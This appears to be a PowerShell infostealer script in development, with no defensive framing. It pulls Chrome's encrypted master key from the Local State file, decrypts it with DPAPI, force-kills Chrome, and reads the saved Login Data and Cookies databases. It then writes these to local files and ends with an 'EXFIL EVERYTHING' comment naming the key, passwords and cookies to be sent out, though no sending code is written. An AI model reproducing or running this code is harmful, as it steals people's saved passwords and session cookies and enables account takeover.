## PULL THE DPAPI-ENCRYPTED AES MASTERKEY FROM THE LOCAL STATE FILE
$encrKeyPath = $env:LOCALAPPDATA + '\Google\Chrome\User Data\Local State'
$encrKey = [System.IO.File]::ReadAllText($encrKeyPath)
$encrKey = ConvertFrom-Json $encrKey
$encrKey = $encrKey.os_crypt.encrypted_key

## DECODE THE KEY FROM BASE64 INTO BYTES
[byte[]]$decodedKey = [System.Convert]::FromBase64String($encrKey)
$decodedKey = $decodedKey | Select-Object -Skip 5
$decodeKey

## USE THE DPAPI TO DECRYPT THE KEY AND CONVERT IT TO HEX
$AESKey = [System.Security.Cryptography.ProtectedData]::Unprotect($decodedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser);
$hexdecKey = ($AESKey | ForEach-Object ToString X2) -join '' #Convert byte[] to hex

# KILL CHROME BECAUSE IT LOCKS THE FILES
taskkill /f /t /im chrome.exe

## GRAB THE LOGIN DATA AND COOKIE FILES
Write-Host "Getting files data"
$loginDataBytes = [IO.File]::ReadAllBytes($env:LOCALAPPDATA + '\Google\Chrome\User Data\Default\Login Data')
$cookieBytes = [IO.File]::ReadAllBytes($env:LOCALAPPDATA + '\Google\Chrome\User Data\Default\Cookies')

# TEST CODE
[IO.File]::WriteAllBytes("Cookies.bin", $cookieBytes)
[IO.File]::WriteAllBytes("LoginData.bin", $loginDataBytes)

## EXFIL EVERYTHING

# $hexDecKey, $loginDataBytes, $cookieBytes
